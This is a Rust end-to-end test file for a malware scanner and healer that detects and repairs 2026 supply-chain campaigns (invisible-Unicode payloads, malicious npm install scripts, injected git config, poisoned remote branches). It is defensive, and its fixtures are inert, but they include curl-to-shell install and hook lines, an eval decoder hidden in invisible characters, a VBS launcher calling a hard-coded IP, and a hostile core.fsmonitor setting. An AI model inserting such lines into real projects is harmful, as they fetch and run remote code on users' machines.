//! End-to-end tests for the 2026 campaign coverage: GlassWorm's invisible
//! Unicode, Shai-Hulud install scripts, the fake-interview keylogger kit, the
//! npm-loader drop files, injected git config, and repairing a poisoned remote
//! branch with `repos --fix`.
//!
//! Detector opt-out marker: POLINRIDER-HUNTER-DETECTOR
//!
//! Every payload is inert: the recognisable shape with a harmless body.

use std::path::{Path, PathBuf};

use polinrider_hunter::{gitconfig, healer, scanner, signatures};

fn home() -> PathBuf {
    use std::sync::OnceLock;
    static HOME: OnceLock<PathBuf> = OnceLock::new();
    HOME.get_or_init(|| {
        let p = std::env::temp_dir().join(format!("prh-camp-home-{}", std::process::id()));
        std::fs::create_dir_all(&p).expect("create test home");
        std::env::set_var("POLINRIDER_HOME", &p);
        p
    })
    .clone()
}

struct Sandbox {
    root: PathBuf,
}
impl Sandbox {
    fn new(name: &str) -> Sandbox {
        home();
        let stamp = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).map(|d| d.as_nanos()).unwrap_or(0);
        let root = std::env::temp_dir().join(format!("prh-camp-{name}-{stamp}"));
        std::fs::create_dir_all(&root).expect("create sandbox");
        Sandbox { root }
    }
    fn write(&self, rel: &str, bytes: &[u8]) -> PathBuf {
        let p = self.root.join(rel);
        if let Some(parent) = p.parent() {
            std::fs::create_dir_all(parent).expect("mkdir");
        }
        std::fs::write(&p, bytes).expect("write");
        p
    }
}
impl Drop for Sandbox {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(&self.root);
    }
}

fn git(dir: &Path, args: &[&str]) -> String {
    let out = std::process::Command::new("git")
        .arg("-C")
        .arg(dir)
        .args(["-c", "user.name=T", "-c", "user.email=t@example.com", "-c", "commit.gpgsign=false", "-c", "core.autocrlf=false"])
        .args(args)
        .env("GIT_TERMINAL_PROMPT", "0")
        .output()
        .expect("git");
    assert!(out.status.success(), "git {:?} failed: {}", args, String::from_utf8_lossy(&out.stderr));
    String::from_utf8_lossy(&out.stdout).trim().to_string()
}

fn hunter_bin() -> PathBuf {
    let mut p = std::env::current_exe().expect("test exe path");
    p.pop();
    if p.ends_with("deps") {
        p.pop();
    }
    p.join(format!("polinrider-hunter{}", std::env::consts::EXE_SUFFIX))
}

fn run_hunter(args: &[&str]) -> (i32, String) {
    let out = std::process::Command::new(hunter_bin())
        .args(args)
        .arg("--no-color")
        .env("POLINRIDER_HOME", home())
        .output()
        .expect("run polinrider-hunter");
    let mut text = String::from_utf8_lossy(&out.stdout).into_owned();
    text.push_str(&String::from_utf8_lossy(&out.stderr));
    (out.status.code().unwrap_or(-1), text)
}

/// `n` variation selectors from the supplement block, the way GlassWorm encodes bytes.
fn invisible(n: usize) -> String {
    (0..n).map(|i| char::from_u32(0xE0100 + (i as u32 % 0xEF)).unwrap()).collect()
}

// ---------------------------------------------------------------------------

#[test]
fn glassworm_invisible_unicode_payload_is_cut_and_the_code_around_it_kept() {
    let sb = Sandbox::new("glassworm");
    let before = "const vscode = require('vscode');\nfunction activate(ctx) { console.log('hi'); }\n";
    let payload = format!("const _ = '{}';eval(String.fromCharCode(...[..._].map(c => c.codePointAt(0) - 0xE0100)));\n", invisible(300));
    let after = "module.exports = { activate };\n";
    let file = sb.write("extension.js", format!("{before}{payload}{after}").as_bytes());

    let f = scanner::scan_file(&file).expect("finding");
    assert!(f.is_critical(), "invisible run must be critical in a .js file: {:?}", f.hits);
    assert!(f.hits.iter().any(|h| h.ioc == "invisible-unicode"));
    assert!(f.hits.iter().any(|h| h.ioc == "glassworm-decoder"), "decoder constant corroborates");

    let outcome = healer::heal(&f, false);
    assert!(matches!(outcome, healer::Outcome::Healed { .. }), "{outcome:?}");
    let cleaned = std::fs::read(&file).unwrap();
    assert_eq!(String::from_utf8_lossy(&cleaned), format!("{before}{after}"), "legit code byte-identical, payload line gone");
    assert!(scanner::scan_file(&file).is_none(), "second pass finds nothing");
}

#[test]
fn a_single_emoji_variation_selector_is_not_an_infection() {
    let sb = Sandbox::new("emoji");
    let file = sb.write("ui.js", "const label = '✔️ done ❤️ 👨‍👩‍👧';\n".as_bytes());
    assert!(scanner::scan_file(&file).is_none());
}

#[test]
fn invisible_unicode_in_prose_is_only_a_suspicion() {
    let sb = Sandbox::new("prose");
    let file = sb.write("notes.md", format!("some text {} more\n", invisible(40)).as_bytes());
    let f = scanner::scan_file(&file).expect("finding");
    assert!(!f.is_critical());
}

#[test]
fn shai_hulud_install_script_is_flagged_and_json_is_never_rewritten() {
    let sb = Sandbox::new("shai");
    let pkg = br#"{
  "name": "innocent-lib",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "node bundle.js",
    "test": "jest"
  }
}
"#;
    let file = sb.write("package.json", pkg);
    let f = scanner::scan_file(&file).expect("finding");
    assert!(f.is_critical());
    assert!(f.hits.iter().any(|h| h.ioc == "shai-hulud-lifecycle"));
    // Structured file: reported, never spliced (the healer says so in words).
    let outcome = healer::heal(&f, false);
    assert!(matches!(outcome, healer::Outcome::Skipped(_) | healer::Outcome::Failed(_)), "{outcome:?}");
    assert_eq!(std::fs::read(&file).unwrap(), pkg.to_vec());

    let curl = sb.write("p2/package.json", br#"{"scripts":{"preinstall":"curl -s http://1.2.3.4/x.sh | sh"}}"#);
    let f2 = scanner::scan_file(&curl).expect("finding");
    // On a machine with real-time antivirus the fixture itself may be quarantined
    // as soon as it is written; the scanner then reports the refused read rather
    // than silently calling the file clean - which is the right answer too.
    assert!(
        f2.hits.iter().any(|h| (h.ioc == "lifecycle-fetch-exec" && h.sev == signatures::Severity::Critical) || h.ioc == "read-blocked"),
        "{:?}", f2.hits
    );
    // The matcher itself, on bytes the antivirus never sees:
    let direct = scanner::scan_blob(Path::new("package.json"), br#"{"scripts":{"preinstall":"curl -s http://1.2.3.4/x.sh | sh"}}"#).expect("finding");
    assert!(direct.hits.iter().any(|h| h.ioc == "lifecycle-fetch-exec" && h.sev == signatures::Severity::Critical), "{:?}", direct.hits);

    let honest = sb.write("p3/package.json", br#"{"scripts":{"postinstall":"husky install","build":"tsc"}}"#);
    assert!(scanner::scan_file(&honest).is_none(), "an ordinary postinstall is not a finding");
}

#[test]
fn the_fake_interview_keylogger_kit_is_critical_only_as_a_pair() {
    let sb = Sandbox::new("beaver");
    let pair = sb.write("a/package.json", br#"{"dependencies":{"node-global-key-listener":"^0.3.0","screenshot-desktop":"^1.15.0","axios":"^1"}}"#);
    let f = scanner::scan_file(&pair).expect("finding");
    assert!(f.is_critical());
    assert!(f.hits.iter().any(|h| h.ioc == "keylogger-kit"));

    let single = sb.write("b/package.json", br#"{"dependencies":{"screenshot-desktop":"^1.15.0"}}"#);
    assert!(scanner::scan_file(&single).is_none(), "one of the pair alone is an ordinary desktop app, not a finding");
}

#[test]
fn the_npm_loader_drop_files_are_whole_file_payloads() {
    let sb = Sandbox::new("npmloader");
    let env = sb.write(".config/runtimedev-link/agent.env", b"export SSTAR_API_BASE='http://194.11.226.41:4000'\nexport SSTAR_DEPLOYMENT_HASH='abc'\n");
    let vbs = sb.write(".local/share/runtimedev-link/start.vbs", b"Set sh = CreateObject(\"WScript.Shell\")\r\nsh.Run \"node npx-cli.js -y runtimedev-link@latest --token http://194.11.226.41:4000|abc\", 0, False\r\n");
    for p in [&env, &vbs] {
        let f = scanner::scan_file(p).expect("finding");
        assert!(f.is_critical(), "{}: {:?}", p.display(), f.hits);
        let outcome = healer::heal(&f, false);
        assert!(matches!(outcome, healer::Outcome::Deleted), "{}: {outcome:?}", p.display());
        assert!(!p.exists());
    }
}

#[test]
fn an_injected_core_fsmonitor_is_unset_and_husky_is_left_alone() {
    let sb = Sandbox::new("gitcfg");
    let repo = sb.root.join("repo");
    std::fs::create_dir_all(&repo).unwrap();
    git(&repo, &["init", "-q", "-b", "main"]);
    git(&repo, &["config", "core.fsmonitor", "node .git/evil.js"]);
    git(&repo, &["config", "core.hooksPath", ".husky/_"]);
    std::fs::create_dir_all(repo.join(".husky/_")).unwrap();
    std::fs::write(repo.join(".husky/_/pre-commit"), b"#!/bin/sh\nnpx lint-staged\n").unwrap();

    let hits = gitconfig::audit(&repo);
    let fsm = hits.iter().find(|h| h.key == "core.fsmonitor").expect("fsmonitor reported");
    assert_eq!(fsm.sev, signatures::Severity::Critical);
    assert!(fsm.fixable);
    assert!(hits.iter().all(|h| h.key != "core.hooksPath"), "husky's hooksPath is not a finding");
    assert!(hits.iter().all(|h| !h.key.starts_with("hook:")), "an honest husky hook is not a finding");

    assert!(gitconfig::fix(fsm, false));
    let after = git(&repo, &["config", "--local", "--list"]);
    assert!(!after.contains("core.fsmonitor"), "unset: {after}");
    assert!(after.contains("core.hookspath=.husky/_"), "husky untouched");

    // A hook that curls into sh IS a finding.
    std::fs::write(repo.join(".husky/_/post-checkout"), b"#!/bin/sh\ncurl -s http://1.2.3.4/p | sh\n").unwrap();
    let hits2 = gitconfig::audit(&repo);
    assert!(hits2.iter().any(|h| h.key == "hook:post-checkout" && h.sev == signatures::Severity::Critical));

    // A nested bare repository inside the work tree is reported.
    let nested = repo.join("vendor/thing.git");
    std::fs::create_dir_all(&nested).unwrap();
    git(&nested, &["init", "-q", "--bare"]);
    git(&nested, &["config", "core.fsmonitor", "powershell -c calc"]);
    let hits3 = gitconfig::audit(&repo);
    assert!(hits3.iter().any(|h| h.key == "nested-repo"));
    assert!(hits3.iter().any(|h| h.key == "core.fsmonitor" && h.location.starts_with(&nested)), "nested config audited too");
}

/// The attack seen on four real repositories: the victim's own latest commit is
/// re-pushed with the payload appended to a config file (same message, same
/// author date), so the remote is "one commit ahead" of the clean local branch.
#[test]
fn a_poisoned_remote_branch_is_repaired_by_repos_fix() {
    let sb = Sandbox::new("remotefix");
    let bare = sb.root.join("origin.git");
    let a = sb.root.join("a");
    let b = sb.root.join("b");
    std::fs::create_dir_all(&bare).unwrap();
    std::fs::create_dir_all(&a).unwrap();
    git(&bare, &["init", "-q", "--bare", "-b", "main"]);

    // The victim's clean repository.
    git(&a, &["init", "-q", "-b", "main"]);
    let clean = "const config = {\n  plugins: { '@tailwindcss/postcss': {} },\n};\n\nexport default config;\n";
    std::fs::write(a.join("postcss.config.mjs"), clean).unwrap();
    std::fs::write(a.join("README.md"), "hi\n").unwrap();
    git(&a, &["add", "."]);
    git(&a, &["commit", "-q", "-m", "feat: add 3D flip card utilities"]);
    git(&a, &["remote", "add", "origin", bare.to_str().unwrap()]);
    git(&a, &["push", "-q", "-u", "origin", "main"]);
    let clean_sha = git(&a, &["rev-parse", "HEAD"]);

    // The attacker: clone, rewrite the same commit with the payload, force-push.
    git(&sb.root, &["clone", "-q", bare.to_str().unwrap(), "b"]);
    let pad: String = std::iter::repeat('\t').take(500).collect();
    let poisoned = format!("{}{}global.i = 'A8-2941';global.r=require;\n", clean.trim_end_matches('\n'), pad);
    std::fs::write(b.join("postcss.config.mjs"), poisoned).unwrap();
    git(&b, &["commit", "-q", "-a", "--amend", "--no-edit"]);
    git(&b, &["push", "-q", "--force", "origin", "main"]);
    let bad_sha = git(&bare, &["rev-parse", "main"]);
    assert_ne!(bad_sha, clean_sha);

    // The victim fetches and audits.
    git(&a, &["fetch", "-q", "origin"]);
    let (code, out) = run_hunter(&["repos", "--no-fetch", a.to_str().unwrap()]);
    assert_eq!(code, 1, "{out}");
    assert!(out.contains("INFECTED") && out.contains("postcss.config.mjs"), "{out}");
    assert!(out.contains("FIXABLE"), "the plan is offered: {out}");

    // Dry run changes nothing.
    let (_, dry) = run_hunter(&["repos", "--no-fetch", "--fix", "--dry-run", a.to_str().unwrap()]);
    assert!(dry.contains("would run: git push --force-with-lease"), "{dry}");
    assert_eq!(git(&bare, &["rev-parse", "main"]), bad_sha);

    // The fix.
    let (code, out) = run_hunter(&["repos", "--no-fetch", "--fix", a.to_str().unwrap()]);
    assert_eq!(code, 0, "{out}");
    assert!(out.contains("repaired"), "{out}");
    assert_eq!(git(&bare, &["rev-parse", "main"]), clean_sha, "remote main is the clean commit again");
    assert_eq!(git(&a, &["rev-parse", "origin/main"]), clean_sha);

    // Idempotent: nothing left to report.
    let (code, out) = run_hunter(&["repos", "--no-fetch", a.to_str().unwrap()]);
    assert_eq!(code, 0, "{out}");
}

#[test]
fn repos_fix_refuses_when_the_remote_has_real_work_too() {
    let sb = Sandbox::new("remoteblocked");
    let bare = sb.root.join("origin.git");
    let a = sb.root.join("a");
    let b = sb.root.join("b");
    std::fs::create_dir_all(&bare).unwrap();
    std::fs::create_dir_all(&a).unwrap();
    git(&bare, &["init", "-q", "--bare", "-b", "main"]);
    git(&a, &["init", "-q", "-b", "main"]);
    std::fs::write(a.join("postcss.config.mjs"), "export default {};\n").unwrap();
    git(&a, &["add", "."]);
    git(&a, &["commit", "-q", "-m", "init"]);
    git(&a, &["remote", "add", "origin", bare.to_str().unwrap()]);
    git(&a, &["push", "-q", "-u", "origin", "main"]);

    git(&sb.root, &["clone", "-q", bare.to_str().unwrap(), "b"]);
    // A colleague's genuine commit...
    std::fs::write(b.join("feature.js"), "export const x = 1;\n").unwrap();
    git(&b, &["add", "."]);
    git(&b, &["commit", "-q", "-m", "feat: real work"]);
    // ...followed by the infection.
    let pad: String = std::iter::repeat(' ').take(500).collect();
    std::fs::write(b.join("postcss.config.mjs"), format!("export default {{}};{pad}global.i = 'A9-4221';\n")).unwrap();
    git(&b, &["commit", "-q", "-a", "-m", "chore: config"]);
    git(&b, &["push", "-q", "origin", "main"]);
    let remote_sha = git(&bare, &["rev-parse", "main"]);

    git(&a, &["fetch", "-q", "origin"]);
    let (code, out) = run_hunter(&["repos", "--no-fetch", "--fix", a.to_str().unwrap()]);
    assert_eq!(code, 1, "{out}");
    assert!(out.contains("BLOCKED") && out.contains("not part of the infection"), "{out}");
    assert_eq!(git(&bare, &["rev-parse", "main"]), remote_sha, "nothing was pushed");
}

/// The infection arriving through a *merge* commit must still be repairable.
///
/// Regression test. `plan_remote_fixes` used to ask `git diff-tree` what each
/// divergent commit changed, one commit at a time. `diff-tree` prints nothing
/// for a merge commit unless it is given `-m`/`--cc`, so a merge looked like it
/// touched no files at all, failed the "does this commit touch the infection?"
/// test, and the branch was refused with the self-contradicting reason
/// "changes 0 file(s) that are not part of the infection".
///
/// That is the common case rather than a corner: a campaign that re-pushes
/// through a pull request produces exactly this shape, and it left every
/// affected branch unrepairable by the tool that had just correctly found it.
#[test]
fn repos_fix_sees_through_a_merge_commit() {
    let sb = Sandbox::new("remotemerge");
    let bare = sb.root.join("origin.git");
    let a = sb.root.join("a");
    let b = sb.root.join("b");
    std::fs::create_dir_all(&bare).unwrap();
    std::fs::create_dir_all(&a).unwrap();
    git(&bare, &["init", "-q", "--bare", "-b", "main"]);

    // The victim's clean repository.
    git(&a, &["init", "-q", "-b", "main"]);
    let clean = "export default { plugins: {} };\n";
    std::fs::write(a.join("postcss.config.mjs"), clean).unwrap();
    std::fs::write(a.join("README.md"), "hi\n").unwrap();
    git(&a, &["add", "."]);
    git(&a, &["commit", "-q", "-m", "feat: initial"]);
    git(&a, &["remote", "add", "origin", bare.to_str().unwrap()]);
    git(&a, &["push", "-q", "-u", "origin", "main"]);
    let clean_sha = git(&a, &["rev-parse", "HEAD"]);

    // The infection lands on a side branch and reaches main through a merge -
    // the shape a poisoned pull request leaves behind.
    git(&sb.root, &["clone", "-q", bare.to_str().unwrap(), "b"]);
    git(&b, &["checkout", "-q", "-b", "side"]);
    let pad: String = std::iter::repeat(' ').take(500).collect();
    let poisoned = format!("{}{}global.i = 'A9-4221';global.r=require;\n", clean.trim_end_matches('\n'), pad);
    std::fs::write(b.join("postcss.config.mjs"), poisoned).unwrap();
    git(&b, &["commit", "-q", "-a", "-m", "chore: build config"]);
    git(&b, &["checkout", "-q", "main"]);
    git(&b, &["merge", "-q", "--no-ff", "-m", "Merge pull request #73 from side", "side"]);
    git(&b, &["push", "-q", "origin", "main"]);

    // The remote tip really is a merge, and the only file it adds is the
    // infected one - so the documented rule permits the push.
    let parents = git(&bare, &["log", "-1", "--format=%p", "main"]);
    assert_eq!(parents.split_whitespace().count(), 2, "the remote tip must be a merge commit");

    git(&a, &["fetch", "-q", "origin"]);
    let (code, out) = run_hunter(&["repos", "--no-fetch", a.to_str().unwrap()]);
    assert_eq!(code, 1, "{out}");
    assert!(out.contains("INFECTED"), "{out}");
    assert!(!out.contains("changes 0 file(s)"), "the merge must not read as an empty diff: {out}");
    assert!(out.contains("FIXABLE"), "a merge-delivered infection is still repairable: {out}");

    // And the repair works end to end.
    let (code, out) = run_hunter(&["repos", "--no-fetch", "--fix", a.to_str().unwrap()]);
    assert_eq!(code, 0, "{out}");
    assert_eq!(git(&bare, &["rev-parse", "main"]), clean_sha, "remote main is the clean commit again");
}

/// A repository's own anti-malware hook is a gate, not a payload.
///
/// Regression test. `audit_hooks` exempted only files naming *this* tool, so a
/// hand-written PolinRider pre-commit hook - which necessarily quotes the
/// strings it greps for - was reported as `Critical` "hook carries a campaign
/// indicator". Telling a maintainer their own defence is the malware is the
/// worst false positive this tool can produce: the obvious fix is to delete the
/// defence. The file scanner already knew better; the hook auditor now uses the
/// same exemption.
#[test]
fn a_repositorys_own_anti_malware_hook_is_not_called_malware() {
    let sb = Sandbox::new("defensivehook");
    let repo = sb.root.join("repo");
    std::fs::create_dir_all(&repo).unwrap();
    git(&repo, &["init", "-q", "-b", "main"]);

    // A real defensive hook: it quotes indicator strings because it hunts them.
    let hook = "#!/usr/bin/env bash\n\
                # PolinRider self-healing pre-commit hook.\n\
                set -euo pipefail\n\
                # Untrack a malicious committed .env (PolinRider drops one with AUTH_API_KEY).\n\
                if grep -qE 'AUTH_API_KEY|auth-confirm-eight' .env 2>/dev/null; then\n\
                  echo 'removing malicious committed .env'\n\
                fi\n\
                if grep -qE \"global[.]i *=|A8-[0-9]{4}|0xa322e5f3\" -r .; then\n\
                  echo 'malware detected - commit blocked'; exit 1\n\
                fi\n\
                exit 0\n";
    std::fs::create_dir_all(repo.join(".githooks")).unwrap();
    std::fs::write(repo.join(".githooks/pre-commit"), hook).unwrap();
    git(&repo, &["config", "core.hooksPath", ".githooks"]);

    let hits = gitconfig::audit(&repo);
    let hook_hits: Vec<&gitconfig::ConfigHit> = hits.iter().filter(|h| h.key.starts_with("hook:")).collect();
    assert!(
        hook_hits.is_empty(),
        "the repository's own defensive hook was reported as malware: {:?}",
        hook_hits.iter().map(|h| (&h.key, h.why)).collect::<Vec<_>>()
    );

    // The exemption must not become a blanket pass for anything under .githooks:
    // a hook that actually downloads and runs code is still a finding.
    std::fs::write(
        repo.join(".githooks/post-checkout"),
        "#!/bin/sh\ncurl -s https://example.invalid/x.sh | sh\n",
    )
    .unwrap();
    let hits = gitconfig::audit(&repo);
    assert!(
        hits.iter().any(|h| h.key == "hook:post-checkout"),
        "a genuinely hostile hook must still be reported: {:?}",
        hits.iter().map(|h| &h.key).collect::<Vec<_>>()
    );
}

/// A clean tip is not a clean repository.
///
/// `repos` audits ref tips, which answers "what would run if I checked this
/// out". It does not answer "is the payload still in here": healing a config
/// and committing the fix leaves the poisoned blob in the object database,
/// reachable by object id for anyone who can read the repo. On the three
/// repositories this tool was built for, every tip audited clean while
/// thirteen payload blobs were still present, and nothing reported them.
///
/// `--history` walks every blob reachable from any ref instead.
#[test]
fn history_finds_the_payload_a_clean_tip_hides() {
    let sb = Sandbox::new("history");
    let repo = sb.root.join("repo");
    std::fs::create_dir_all(&repo).unwrap();
    git(&repo, &["init", "-q", "-b", "main"]);

    let clean = "export default { plugins: {} };\n";
    std::fs::write(repo.join("postcss.config.mjs"), clean).unwrap();
    // A detector lives here too: it quotes indicators by design and must never
    // be mistaken for one of the payloads we are counting.
    std::fs::write(
        repo.join("check-malware.mjs"),
        "// malware gate\nconst PATTERN = /global[.]i *=|A[89]-[0-9]{4}|0xa322e5f3/;\nexport default PATTERN;\n",
    )
    .unwrap();
    git(&repo, &["add", "."]);
    git(&repo, &["commit", "-q", "-m", "chore: init"]);

    // The infection lands...
    let pad: String = std::iter::repeat(' ').take(500).collect();
    let poisoned = format!("{}{}global.i = 'A9-4221';global.r=require;\n", clean.trim_end_matches('\n'), pad);
    std::fs::write(repo.join("postcss.config.mjs"), &poisoned).unwrap();
    git(&repo, &["commit", "-q", "-a", "-m", "chore: build config"]);
    let poisoned_blob = git(&repo, &["rev-parse", "HEAD:postcss.config.mjs"]);

    // ...and is then cleaned up and committed, exactly as a maintainer would.
    std::fs::write(repo.join("postcss.config.mjs"), clean).unwrap();
    git(&repo, &["commit", "-q", "-a", "-m", "security: strip PolinRider payload"]);

    // The tip is genuinely clean, and the tip-only audit says so.
    let (code, out) = run_hunter(&["repos", "--no-fetch", repo.to_str().unwrap()]);
    assert_eq!(code, 0, "the tip really is clean: {out}");
    assert!(out.contains("No indicators on any ref"), "{out}");

    // The payload is still in the object database, and --history says so.
    let (code, out) = run_hunter(&["repos", "--no-fetch", "--history", repo.to_str().unwrap()]);
    assert_eq!(code, 1, "a payload left in history is a finding: {out}");
    assert!(out.contains("IN HISTORY"), "{out}");
    assert!(out.contains(&poisoned_blob[..12]), "the blob id to purge is named: {out}");
    assert!(out.contains("postcss.config.mjs"), "{out}");
    assert!(out.contains("filter-repo"), "the purge command is offered: {out}");
    // The detector in the same history is not counted as a payload.
    assert!(!out.contains("check-malware.mjs"), "a detector is not a payload: {out}");
}
